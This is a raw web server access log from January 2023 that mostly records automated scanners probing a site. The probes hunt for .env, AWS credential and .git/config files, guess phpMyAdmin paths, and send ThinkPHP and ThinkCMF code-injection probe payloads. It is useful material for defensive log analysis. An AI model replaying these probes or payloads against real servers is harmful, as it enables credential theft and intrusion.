209.141.34.187 - - [13/Jan/2023:14:44:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.35.128 - - [13/Jan/2023:14:44:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.41.193 - - [13/Jan/2023:14:44:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.34.187 - - [13/Jan/2023:14:44:21 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.35.128 - - [13/Jan/2023:14:44:21 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.122.184 - - [13/Jan/2023:14:44:21 -0600] "GET / HTTP/1.1" 301 233 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.122.184 - - [13/Jan/2023:14:44:22 -0600] "GET /favicon.ico HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.118.237 - - [13/Jan/2023:14:46:29 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
183.136.225.32 - - [13/Jan/2023:14:48:47 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
185.83.146.154 - - [13/Jan/2023:14:52:39 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:40 -0600] "GET /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:40 -0600] "POST /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:41 -0600] "POST /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:42 -0600] "GET /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:43 -0600] "POST /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:44 -0600] "GET /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:45 -0600] "POST /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:46 -0600] "GET /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:47 -0600] "GET /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:47 -0600] "POST /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:48 -0600] "POST /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [13/Jan/2023:14:52:49 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:49 -0600] "GET /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:50 -0600] "POST /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:51 -0600] "GET /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:52 -0600] "GET /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:52 -0600] "POST /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.146.154 - - [13/Jan/2023:14:52:53 -0600] "POST /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
183.136.225.32 - - [13/Jan/2023:14:54:00 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [13/Jan/2023:14:54:21 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [13/Jan/2023:14:55:02 -0600] "GET /robots.txt HTTP/1.1" 301 242 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
152.89.196.211 - - [13/Jan/2023:14:58:35 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.81.39.134 - - [13/Jan/2023:15:03:34 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.81.39.134 - - [13/Jan/2023:15:03:34 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.81.39.134 - - [13/Jan/2023:15:03:41 -0600] "GET /sendgrid/.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.81.39.134 - - [13/Jan/2023:15:03:41 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [13/Jan/2023:15:10:29 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
212.38.40.215 - - [13/Jan/2023:15:25:53 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
80.94.92.57 - - [13/Jan/2023:15:27:13 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [13/Jan/2023:15:30:53 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.92.60 - - [13/Jan/2023:15:33:46 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
113.142.58.212 - - [13/Jan/2023:15:37:13 -0600] "GET / HTTP/1.1" 400 226 "-" "-"
92.118.39.29 - - [13/Jan/2023:15:38:14 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
45.93.16.71 - - [13/Jan/2023:15:42:14 -0600] "GET / HTTP/1.1" 301 232 "-" "libwww-perl/6.67"
152.89.196.211 - - [13/Jan/2023:16:00:47 -0600] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [13/Jan/2023:16:10:29 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [13/Jan/2023:16:17:50 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.95.25 - - [13/Jan/2023:16:27:08 -0600] "CONNECT cipicaoadminpanel.xyz:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
152.89.196.211 - - [13/Jan/2023:16:30:19 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
81.224.174.249 - - [13/Jan/2023:16:33:01 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
152.89.196.211 - - [13/Jan/2023:16:40:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.180.143.72 - - [13/Jan/2023:16:44:42 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
5.138.73.21 - - [13/Jan/2023:16:53:57 -0600] "HEAD / HTTP/1.1" 301 - "-" "Xenu Link Sleuth/1.3.8"
143.110.222.166 - - [13/Jan/2023:17:05:56 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [13/Jan/2023:17:25:02 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Jan/2023:17:25:03 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [13/Jan/2023:17:28:26 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:15 -0600] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:15 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:15 -0600] "GET /phpmy/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:16 -0600] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:16 -0600] "GET /dbadmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:16 -0600] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:16 -0600] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:16 -0600] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:17 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:18 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:18 -0600] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:18 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:18 -0600] "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:18 -0600] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:19 -0600] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:19 -0600] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:19 -0600] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:19 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:19 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:20 -0600] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:20 -0600] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:20 -0600] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:20 -0600] "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:21 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:21 -0600] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:21 -0600] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:22 -0600] "GET /admin/pma/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:22 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:22 -0600] "GET /__phpmyadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:23 -0600] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:23 -0600] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:23 -0600] "GET /pma/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:23 -0600] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:24 -0600] "GET /administrator/web/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:24 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:25 -0600] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:25 -0600] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:25 -0600] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:26 -0600] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:26 -0600] "GET /phpmyadmin2011/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:26 -0600] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:26 -0600] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:27 -0600] "GET /admin/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:27 -0600] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:27 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:28 -0600] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:28 -0600] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:29 -0600] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:29 -0600] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:29 -0600] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:30 -0600] "GET /mysql/web/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:30 -0600] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:30 -0600] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:30 -0600] "GET /phppma/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
